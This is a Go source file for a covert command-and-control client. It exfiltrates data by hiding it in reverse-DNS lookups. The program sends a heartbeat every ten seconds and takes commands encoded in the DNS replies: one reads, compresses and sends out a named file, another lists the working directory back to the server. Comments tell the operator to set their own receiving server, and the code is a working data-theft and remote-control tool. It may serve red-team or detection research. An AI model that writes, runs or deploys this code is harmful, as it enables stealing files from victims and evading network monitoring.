package main

import (
	"bufio"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

func resolveCommand(host []string, bl *int) {
	// Change the mappings here to customize what triggers will be responsible for different operations. Ex: "cmd": "mail"
	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "ls": "ls"}

	// If the host contains the string "cmd", we know that the server is sending the client a command to execute.
	if strings.Contains(host[0], trigger_mappings["cmd"]) {
		fmt.Printf("Received command: %v\n", host[0])
		sections := strings.Split(host[0], ".")
		switch sections[1] {
		// Download command has been received
		case trigger_mappings["exf"]:
			fmt.Printf("Downloading: %v\n", (sections[2] + "." + sections[3]))
			// Perform the usual exfil operation as you would otherwise
			dat := setup_exfil(sections[2] + "." + sections[3])
			var mode string = "exfil"
			begin_comm(&dat, bl, &mode)

		// List directory command has been received
		case trigger_mappings["ls"]:
			var output_bytes []byte
			var mode string = "c2"
			files, _ := os.ReadDir(".")
			for i := 0; i < len(files); i++ {
				// Format the output with tabs, and the name of each file.
				output_bytes := []byte("\t* " + files[i].Name())

				// Append "bls" ('begin ls') to the front of the list so that the server knows how to decode the output
				output_bytes = append([]byte("bls"), output_bytes...)

				// Add a newline to reduce formatting efforts on the server side
				output_bytes = append(output_bytes[:], []byte("\n")...)
				begin_comm(&output_bytes, bl, &mode)
			}

			// Send "els" ('end ls') to tell the server that the operation has ended.
			output_bytes = []byte("els")
			begin_comm(&output_bytes, bl, &mode)
		}
	}
}

// We will send the encoded data, and inspect the received hostname to see if the server wants the client to perform any actions. All strings used as triggers here can be replaced.
func resolveAddr(address string, bl *int) {
	// Specify your server address and port that will receive and decode the encoded data
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * 1000,
			}
			return d.DialContext(ctx, network, "127.0.0.1:8053")
		},
	}
	host, _ := r.LookupAddr(context.Background(), address)
	if len(host) > 0 {
		resolveCommand(host, bl)
	}

}

func send_data(set_baseline bool, octets []byte, bl *int, mode ...*string) {

	// Create an empty beginning octet
	var beginning_octet string

	// Create an empty variable in which to hold the entire address
	var constructed string

	// If sending baseline, set the first octet to "172" (pre-defined baseline signifier), fill the next two octets with random values, and store the baseline in the last octet.
	if set_baseline {
		if *mode[0] == "exfil" {
			octets = append(octets, byte(172))
		} else {
			octets = append(octets, byte(185))
		}
		// Set a baseline between 30 to 100
		*bl = rand.Intn(100-30) + 30

		octets = append(octets, byte(rand.Intn(255)), byte(rand.Intn(255)), byte(*bl))

		// Create the address
		constructed = fmt.Sprintf("%v.%v.%v.%v", octets[0], octets[1], octets[2], octets[3])

	} else {

		// For each byte of data, check if the integer representation of the byte added to the baseline will go above 255; if so, Go will 'loop' the value back around to 0 using mod 256. If this will occur, set the
		// digit in the octet at the corresponding index of the 'flipped' octet to 2, and otherwise to 1. In doing this, we create the 'key' that will be used to determine whether we have to 'flip' the value back when
		// decoding the received address.
		for i := 0; i < len(octets); i++ {
			if uint16(octets[i])+uint16(*bl) > 255 {
				beginning_octet += "2"
			} else {
				beginning_octet += "1"
			}

			// Add the baseline to the byte value
			octets[i] = octets[i] + byte(*bl)

			// Create the address
			constructed = fmt.Sprintf("%v.%v.%v.%v", beginning_octet, octets[0], octets[1], octets[2])
		}
	}
	resolveAddr(constructed, bl)
}

// Returns an array of bytes that are the compressed data of the file being exfiltrated.
func setup_exfil(file_path string) []byte {
	// https://www.educative.io/answers/how-to-compress-a-file-in-golang

	// Open the target file and read the data.
	file, err := os.Open(file_path)
	reader := bufio.NewReader(file)
	data, err := io.ReadAll(reader)

	// Create the target compression file and write the data into it.
	file, err = os.Create("compressed.gz")
	if err != nil {
		panic(err)
	}
	w := gzip.NewWriter(file)
	w.Write(data)
	w.Close()

	// Open the compressed data and read the data.
	dat, err := os.ReadFile("compressed.gz")
	if err != nil {
		panic(err)
	}

	err = os.Remove("compressed.gz")
	if err != nil {
		panic(err)
	}
	return dat
}

func add_padding(dat *[]byte) {
	// Pad the data with 0's such that the number of bytes of data is divisible by 3.
	for i := 0; i < (len(*dat) % 3); i++ {
		*dat = append((*dat), 0)
	}
}

func begin_comm(dat *[]byte, bp *int, mode *string) {
	// Set the baseline for the exchange; the list of bytes can be blank for this operation.
	send_data(true, []byte{}, bp, mode)

	add_padding(dat)
	// For each three bytes, send them to be sent encoded into an 'IP address'.
	var prior int = 0
	for index := 0; index < len(*dat); index++ {
		if (index != 0) && (index%3 == 0) {
			send_data(false, (*dat)[prior:index], bp)
			prior = index
		}
	}
	send_data(false, (*dat)[prior:], bp)
}

func main() {
	var baseline int
	var mode string = "c2"
	var command string = "hbt"
	for {
		command_bytes := []byte(command)
		begin_comm(&command_bytes, &baseline, &mode)
		time.Sleep(10000 * time.Millisecond)
	}
}
